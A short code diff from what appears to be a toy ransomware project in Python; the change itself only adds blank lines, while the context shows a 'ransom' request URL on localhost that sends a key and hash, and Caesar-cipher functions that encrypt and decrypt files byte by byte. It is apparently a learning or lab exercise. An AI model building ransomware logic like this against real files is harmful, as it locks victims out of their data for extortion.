@@ -6,6 +6,7 @@ from random import SystemRandom
 
 REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'
 
+
 def caesar_keygen():
     '''
     Generate a Caeser cipher key that is not 0.
@@ -40,6 +41,7 @@ def caesar_decrypt(key, filepath):
             plaintext.append((ord(byte) - key) % 256)
             byte = f.read(1)
     return bytearray(plaintext)
+
 
 def encrypt():
     '''
